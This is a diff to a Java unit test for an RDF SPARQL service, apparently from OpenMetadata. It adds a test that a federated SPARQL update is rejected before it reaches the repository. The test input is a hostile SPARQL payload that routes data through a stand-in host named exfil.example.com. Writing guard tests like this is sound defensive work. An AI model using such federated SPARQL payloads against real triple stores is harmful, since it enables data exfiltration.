@@ -20,11 +20,13 @@ import static org.mockito.ArgumentMatchers.anyString;
 import static org.mockito.ArgumentMatchers.eq;
 import static org.mockito.Mockito.mock;
 import static org.mockito.Mockito.verify;
+import static org.mockito.Mockito.verifyNoInteractions;
 import static org.mockito.Mockito.when;
 
 import org.junit.jupiter.api.Test;
 import org.mockito.ArgumentCaptor;
 import org.openmetadata.service.rdf.federation.SparqlFederationGuard;
+import org.openmetadata.service.rdf.federation.SparqlFederationGuard.FederationDisallowedException;
 
 class RdfSparqlServiceTest {
 
@@ -81,6 +83,18 @@ class RdfSparqlServiceTest {
     service(repository).update(update);
 
     verify(repository).executeSparqlUpdate(update);
+  }
+
+  @Test
+  void rejectsDisallowedFederatedUpdatesBeforeRepositoryExecution() {
+    final RdfRepository repository = mock(RdfRepository.class);
+    final String update =
+        "INSERT { ?subject <urn:copied> ?object } WHERE { "
+            + "SERVICE <https://exfil.example.com/sparql> { ?subject ?predicate ?object } }";
+
+    assertThrows(FederationDisallowedException.class, () -> service(repository).update(update));
+
+    verifyNoInteractions(repository);
   }
 
   @Test
